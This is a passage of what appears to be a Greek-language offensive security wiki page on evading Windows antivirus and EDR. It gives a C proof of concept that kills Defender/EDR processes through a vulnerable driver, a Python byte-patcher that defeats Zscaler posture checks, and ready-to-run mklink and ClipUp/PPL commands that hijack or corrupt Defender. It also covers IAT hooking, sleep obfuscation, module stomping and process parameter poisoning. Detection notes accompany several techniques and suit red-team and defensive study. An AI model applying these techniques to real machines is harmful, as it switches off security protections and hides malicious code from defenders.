Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το user land.
3. **IOCTLs που εκτίθενται από τον driver**
| Κωδικός IOCTL | Δυνατότητα                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματισμός αυθαίρετης διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό Defender/EDR services) |
| `0x990000D0` | Διαγραφή αυθαίρετου αρχείου από τον δίσκο |
| `0x990001D0` | Unload του driver και αφαίρεση του service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις user-mode protections· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τις τερματίσει ή να παραποιήσει kernel objects, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες hardening features.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.
•  Παρακολουθήστε τη δημιουργία νέων *kernel* services και δημιουργήστε alert όταν ένας driver φορτώνεται από world-writable directory ή δεν υπάρχει στη allow-list.
•  Παρακολουθήστε user-mode handles προς custom device objects, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των Posture Checks του Zscaler Client Connector μέσω On-Disk Binary Patching

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες device-posture και βασίζεται στα Windows RPC για την επικοινωνία των αποτελεσμάτων με άλλα components. Δύο αδύναμες επιλογές σχεδιασμού καθιστούν δυνατή μια πλήρη παράκαμψη:

1. Η αξιολόγηση του posture πραγματοποιείται **εξ ολοκλήρου client-side** (ένα boolean αποστέλλεται στον server).
2. Τα internal RPC endpoints επικυρώνουν μόνο ότι το executable που συνδέεται είναι **signed by Zscaler** (μέσω του `WinVerifyTrust`).

Με το **patching τεσσάρων signed binaries στον δίσκο**, και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Αρχική λογική που έγινε patch | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, επομένως κάθε check θεωρείται compliant |
| `ZSAService.exe` | Indirect call προς το `WinVerifyTrust` | Έγινε NOP-ed ⇒ οποιαδήποτε διεργασία, ακόμη και unsigned, μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks στο tunnel | Έγινε short-circuited |

Απόσπασμα από minimal patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι posture checks εμφανίζονται ως **green/compliant**.
* Τα unsigned ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Το compromised host αποκτά unrestricted access στο internal network που ορίζεται από τις Zscaler policies.

Αυτό το case study δείχνει πώς αποφάσεις trust που λαμβάνονται αποκλειστικά από την πλευρά του client και απλοί signature checks μπορούν να παρακαμφθούν με μερικά byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια signer/level hierarchy, ώστε μόνο protected processes ίδιου ή υψηλότερου επιπέδου να μπορούν να κάνουν tamper μεταξύ τους. Από επιθετικής πλευράς, αν μπορείτε να εκκινήσετε νόμιμα ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε benign functionality (π.χ. logging) σε ένα constrained, PPL-backed write primitive εναντίον protected directories που χρησιμοποιούνται από AV/EDR.

Τι κάνει μια process να εκτελείται ως PPL
- Το target EXE (και τυχόν loaded DLLs) πρέπει να είναι signed με PPL-capable EKU.
- Η process πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί compatible protection level που να ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα levels θα αποτύχουν κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και στο LSASS protection εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία εκκίνησης
- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί τα arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το signed system binary `C:\Windows\System32\ClipUp.exe` εκκινείται από μόνο του και δέχεται μια παράμετρο για την εγγραφή ενός log file σε path που καθορίζει ο caller.
- Όταν εκκινείται ως PPL process, η εγγραφή του file πραγματοποιείται με PPL backing.
- Το ClipUp δεν μπορεί να κάνει parse paths που περιέχουν spaces· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά protected locations.

8.3 short path helpers
- List short names: `dir /x` σε κάθε parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Περάστε στο ClipUp το log-path argument για να επιβάλετε τη δημιουργία ενός file σε protected AV directory (π.χ. Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Αν το target binary είναι συνήθως ανοιχτό/locked από το AV ενώ εκτελείται (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή στο boot, πριν ξεκινήσει το AV, εγκαθιστώντας ένα auto-start service που εκτελείται αξιόπιστα νωρίτερα. Επικυρώστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Μετά το reboot, η PPL-backed εγγραφή πραγματοποιείται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το target file και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp πέρα από τη θέση τους· το primitive είναι κατάλληλο για corruption και όχι για ακριβή content injection.
- Απαιτούνται local admin/SYSTEM για την εγκατάσταση/εκκίνηση ενός service και ένα reboot window.
- Το timing είναι κρίσιμο: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά το boot αποφεύγει τα file locks.

Detections
- Process creation του `ClipUp.exe` με ασυνήθιστα arguments, ειδικά όταν έχει ως parent μη τυπικούς launchers, κατά το boot.
- Νέα services ρυθμισμένα για auto-start ύποπτων binaries, τα οποία ξεκινούν σταθερά πριν από το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση services πριν από failures κατά την εκκίνηση του Defender.
- File integrity monitoring σε Defender binaries/Platform directories· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από processes με protected-process flags.
- ETW/EDR telemetry: αναζητήστε processes που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και anomalous χρήση PPL level από non-AV binaries.

Mitigations
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να εκτελούνται ως PPL και κάτω από ποιους parents· αποκλείστε την invocation του ClipUp εκτός legitimate contexts.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start services και παρακολουθείτε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένα τα Defender tamper protection και early-launch protections· ερευνήστε startup errors που υποδεικνύουν binary corruption.
- Εξετάστε την απενεργοποίηση της δημιουργίας 8.3 short names σε volumes που φιλοξενούν security tooling, εφόσον είναι συμβατό με το περιβάλλον σας (κάντε thorough testing).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Το Windows Defender επιλέγει την platform από την οποία εκτελείται, απαριθμώντας τα subfolders κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει το subfolder με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`) και στη συνέχεια εκκινεί από εκεί τα Defender service processes (ενημερώνοντας αντίστοιχα τα service/registry paths). Αυτή η επιλογή εμπιστεύεται τα directory entries, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε attacker-writable path και να επιτύχει DLL sideloading ή service disruption.

Preconditions
- Local Administrator (απαιτείται για τη δημιουργία directories/symlinks κάτω από το Platform folder)
- Δυνατότητα reboot ή trigger του Defender platform re-selection (service restart κατά το boot)
- Απαιτούνται μόνο built-in tools (`mklink`)

Why it works
- Το Defender αποκλείει writes στους δικούς του φακέλους, αλλά η επιλογή της platform εμπιστεύεται τα directory entries και επιλέγει την έκδοση με το υψηλότερο lexicographic όνομα, χωρίς να επικυρώνει ότι ο προορισμός επιλύεται σε protected/trusted path.

Step-by-step (example)
1) Προετοιμάστε ένα writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή διεργασίας στο `C:\TMP\AV\` και τις ρυθμίσεις του service/το registry να αντικατοπτρίζουν αυτήν την τοποθεσία.

Επιλογές Post-exploitation
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLLs που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, ώστε να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός/άρνηση service: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτυγχάνει να εκκινηθεί:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η technique δεν παρέχει privilege escalation από μόνη της· απαιτεί δικαιώματα admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module, κάνοντας hooking στο Import Address Table (IAT) του και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position-independent code (PIC). Αυτό γενικεύει το evasion πέρα από το μικρό API surface που εκθέτουν πολλά kits (π.χ., CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post-exploitation DLLs.

High-level approach
- Κάντε stage ένα PIC blob μαζί με το target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι self-contained και position-independent.
- Κατά τη φόρτωση του host DLL, διασχίστε το IMAGE_IMPORT_DESCRIPTOR και κάντε patch στις IAT entries για τα στοχευμένα imports (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε thin PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail-call στο πραγματικό API address. Τυπικά evasions περιλαμβάνουν:
- Memory mask/unmask γύρω από το call (π.χ., encrypt beacon regions, RWX→RX, αλλαγή page names/permissions) και στη συνέχεια restore μετά το call.
- Call-stack spoofing: κατασκευή benign stack και transition στο target API, ώστε το call-stack analysis να επιλύεται στα αναμενόμενα frames.
- Για compatibility, κάντε export ένα interface ώστε ένα Aggressor script (ή equivalent) να μπορεί να καταχωρίζει ποια APIs θα γίνονται hook για Beacon, BOFs και post-ex DLLs.

Why IAT hooking here
- Λειτουργεί για οποιονδήποτε κώδικα χρησιμοποιεί το hooked import, χωρίς τροποποίηση του tool code ή εξάρτηση από το Beacon για proxy συγκεκριμένων APIs.
- Καλύπτει post-ex DLLs: το hooking των LoadLibrary* σάς επιτρέπει να intercept module loads (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στα API calls τους.
- Επαναφέρει την αξιόπιστη χρήση post-ex commands που κάνουν process spawning απέναντι σε detections βασισμένα στο call stack, κάνοντας wrapping στα CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Εφάρμοσε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr επιδεικνύουν hooking κατά τη διάρκεια του DllMain του loaded module.
- Κράτησε τα wrappers μικρά και PIC-safe· κάνε resolve το πραγματικό API μέσω της αρχικής τιμής IAT που κατέγραψες πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποίησε μεταβάσεις RW → RX για το PIC και απόφυγε να αφήνεις σελίδες ταυτόχρονα writable+executable.

Call-stack spoofing stub
- PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη call chain (return addresses μέσα σε benign modules) και στη συνέχεια κάνουν pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που περιμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
- Συνδύασέ το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγεις μέσα στα αναμενόμενα frames πριν από το API prologue.

Operational integration
- Πρόσθεσε τον reflective loader στην αρχή των post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
- Χρησιμοποίησε ένα Aggressor script για να καταχωρίζεις τα target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από το ίδιο evasion path χωρίς αλλαγές στον κώδικα.

Detection/DFIR considerations
- IAT integrity: entries που κάνουν resolve σε non-image (heap/anon) addresses· περιοδική επαλήθευση των import pointers.
- Stack anomalies: return addresses που δεν ανήκουν σε loaded images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes στο IAT, early DllMain activity που τροποποιεί import thunks, μη αναμενόμενες RX regions που δημιουργούνται κατά το load.
- Image-load evasion: αν γίνεται hooking στο LoadLibrary*, παρακολούθησε ύποπτα loads από automation/clr assemblies που συσχετίζονται με memory masking events.

Related building blocks and examples
- Reflective loaders που εκτελούν IAT patching κατά το load (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook στα imports **κατά τη διάρκεια του** `ProcessImports()`, αντικαθιστώντας τον pointer του loader's `GetProcAddress` με έναν custom resolver που ελέγχει πρώτα τα hooks:

- Δημιούργησε ένα **resident PICO** (persistent PIC object) που επιβιώνει αφού το transient loader PIC κάνει free τον εαυτό του.
- Κάνε export μια συνάρτηση `setup_hooks()` που κάνει overwrite τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παράλειψε τα ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως το `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά, κάνε delegate στο πραγματικό `GetProcAddress`.
- Κατάγραψε τα hook targets κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει valid επειδή βρίσκεται μέσα στο resident PICO.

Αυτό επιτυγχάνει **import-time IAT redirection** χωρίς patching στο code section του loaded DLL μετά το load.

### Forcing hookable imports when the target uses PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στο IAT του target. Αν ένα module κάνει resolve τα APIs μέσω PEB-walk + hash (χωρίς import entry), ανάγκασε ένα πραγματικό import ώστε ο loader's `ProcessImports()` path να το δει:

- Αντικατάστησε το hashed export resolution (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με direct reference όπως το `&WaitForSingleObject`.
- Ο compiler θα παράγει ένα IAT entry, επιτρέποντας interception όταν ο reflective loader κάνει resolve τα imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hook τα **actual wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλα waits, τύλιξε το call σε μια Ekko-style obfuscation chain που κάνει encrypt το in-memory image κατά το idle:

- Χρησιμοποίησε το `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν το `NtContinue` με crafted `CONTEXT` frames.
- Τυπική chain (x64): ρύθμισε το image σε `PAGE_READWRITE` → κάνε RC4 encrypt μέσω του `advapi32!SystemFunction032` πάνω σε ολόκληρο το mapped image → εκτέλεσε το blocking wait → κάνε RC4 decrypt → **επανάφερε τα per-section permissions** κάνοντας walk στα PE sections → κάνε signal την ολοκλήρωση.
- Το `RtlCaptureContext` παρέχει ένα template `CONTEXT`· κλωνοποίησέ το σε πολλαπλά frames και ρύθμισε τα registers (`Rip/Rcx/Rdx/R8/R9`) ώστε να καλούν κάθε step.

Operational detail: επέστρεφε “success” για μεγάλα waits (π.χ. `WAIT_OBJECT_0`), ώστε ο caller να συνεχίζει ενώ το image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τα idle windows και αποφεύγει το κλασικό signature του patched `Sleep()`.

Detection ideas (telemetry-based)
- Bursts από `CreateTimerQueueTimer` callbacks που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα contiguous buffers μεγέθους image.
- Μεγάλης έκτασης `VirtualProtect` που ακολουθείται από custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

Σε CFG-enabled targets, το πρώτο indirect jump σε mid-function gadget όπως `jmp [rbx]` ή `jmp rdi` συνήθως θα κάνει crash τη process με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να διατηρήσεις ενεργές τις Ekko/Kraken-style chains μέσα σε hardened processes:

- Κατάγραψε κάθε indirect destination που χρησιμοποιεί η chain με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και `CFG_CALL_TARGET_VALID` entries.
- Για addresses μέσα σε loaded images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει ολόκληρο το image size.
- Για manually mapped/PIC/stomped regions, χρησιμοποίησε το **allocation base** και το allocation size.
- Κάνε mark όχι μόνο στο dispatch gadget, αλλά και στα exports που προσεγγίζονται indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και σε attacker-controlled executable sections που θα γίνουν indirect targets.

Αυτό μετατρέπει τις ROP/JOP-style sleep chains από primitive που “works only in non-CFG processes” σε reusable primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Η πλήρης αντικατάσταση `CONTEXT` είναι noisy και μπορεί να αποτύχει σε CET Shadow Stack systems, επειδή ένα spoofed `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο sleep-masking pattern είναι:

- Επίλεξε ένα άλλο thread στην ίδια process και διάβασε τα stack bounds του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Κάνε backup το πραγματικό TEB/TIB του current thread.
- Κάνε capture το πραγματικό sleeping context με `GetThreadContext`.
- Αντέγραψε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφη την spoofed `Rsp`/stack state.
- Κατά τη διάρκεια του sleep window, αντέγραψε το `NT_TIB` του spoof thread στο current TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε legitimate stack range.
- Μετά την ολοκλήρωση του wait, επανάφερε το αρχικό TIB και το thread context.

Αυτό διατηρεί ένα CET-consistent instruction pointer, ενώ παραπλανά τους EDR stack walkers που εμπιστεύονται τα TEB stack metadata για την επικύρωση των unwinds.

### APC-based alternative: Kraken Mask

Αν το timer-queue dispatch είναι υπερβολικά signatured, η ίδια sleep-encrypt-spoof-restore sequence μπορεί να εκτελεστεί από ένα suspended helper thread με queued APCs:

- Δημιούργησε ένα helper thread με entrypoint το `NtTestAlert`.
- Κάνε queue τα prepared `CONTEXT` frames/APCs με `NtQueueApcThread` και κάνε drain με `NtAlertResumeThread`.
- Αποθήκευσε την chain state στο heap αντί για το helper stack, ώστε να αποφύγεις την εξάντληση του default 64 KB thread stack.
- Χρησιμοποίησε το `NtSignalAndWaitForSingleObject` για atomic signal του start event και block.
- Κάνε suspend το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειώσεις το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα μισο-επαναφερμένο stack.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα helper-thread/APC signature, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` που ακολουθείται από direct writes στα TEB/TIB stack bounds του current thread.
- `NtQueueApcThread`/`NtAlertResumeThread` chains που καταλήγουν indirectly στα `SystemFunction032`, `VirtualProtect` ή σε helpers για section-permission restoration.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το Module stomping εκτελεί payloads από το **`.text` section ενός DLL που έχει ήδη γίνει mapped μέσα στο target process**, αντί να κάνει allocate obvious private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Το overwrite target πρέπει να είναι ένα **loaded, disk-backed image**, του οποίου ο code space μπορεί να χωρέσει το payload χωρίς να καταστρέψει code paths που χρειάζεται ακόμη η process.

### Reliable target selection

Το naive stomping σε common modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι fragile: το DLL μπορεί να μην έχει φορτωθεί στο remote process και μια υπερβολικά μικρή code region θα κάνει crash τη process. Ένα πιο reliable workflow είναι:

1. Κάνε enumerate τα modules του target process και κράτησε μια **names-only include list** από DLLs που έχουν ήδη φορτωθεί.
2. Κάνε build πρώτα το payload και κατέγραψε το **ακριβές byte size** του.
3. Κάνε scan τα candidate DLLs στον δίσκο και σύγκρινε το PE section **`.text` `Misc_VirtualSize`** με το payload size. Αυτό έχει μεγαλύτερη σημασία από το file size, επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν γίνεται mapped στη μνήμη**.
4. Κάνε parse το **Export Address Table (EAT)** και επίλεξε ένα exported function RVA ως stomp start offset.
5. Υπολόγισε το **blast radius**: αν το payload ξεπερνά το selected function boundary, θα κάνει overwrite τα adjacent exports που είναι τοποθετημένα μετά από αυτό στη μνήμη.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Προτίμησε DLLs που είναι **ήδη φορτωμένα** στην remote process, για να αποφύγεις το telemetry του `LoadLibrary`/των unexpected image loads.
- Προτίμησε exports που εκτελούνται σπάνια από την target application· διαφορετικά, τα normal code paths μπορεί να εκτελέσουν τα stomped bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν αλλαγή του shellcode embedding από string literal σε **byte-array/braced initializer**, ώστε ολόκληρο το buffer να αναπαρίσταται σωστά στον injector source.

Detection ideas
- Remote writes σε **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) αντί για τις πιο συνηθισμένες private RWX/RX allocations.
- Export entry points των οποίων τα in-memory bytes δεν συμφωνούν πλέον με το backing file στον δίσκο.
- Remote threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε legitimate DLL export, του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε DLL `.text` pages, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι τεχνική **process-injection / EDR-evasion** που αποφεύγει το κλασικό remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν target που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης της `CreateProcessW` στη child process** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).

### Poisonable carriers copied by `CreateProcessW`

Χρήσιμα carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Practical carrier constraints:

- Το `lpCommandLine` πρέπει να δείχνει σε **writable memory** για την `CreateProcessW` και περιορίζεται σε **32.767 Unicode χαρακτήρες**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι Unicode environment block από διαδοχικά strings `NAME=VALUE\0`, τα οποία τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα reserved, επομένως το mapping στο `ShellInfo` πρέπει να αντιμετωπίζεται ως implementation detail και όχι ως stable documented contract.

Αυτό μετατρέπει τη normal process creation σε **payload-transfer primitive**. Ο operator δημιουργεί τη child process με attacker-controlled startup data και αφήνει τα Windows να πραγματοποιήσουν το cross-process copy.

### Remote lookup flow without remote write APIs

Μετά τη δημιουργία της child process, κάνε resolve το copied buffer με **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λάβε το `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Διάβασε το remote `PEB`
3. Ακολούθησε το `PEB.ProcessParameters`
4. Διάβασε το `RTL_USER_PROCESS_PARAMETERS`
5. Χρησιμοποίησε τον επιλεγμένο pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

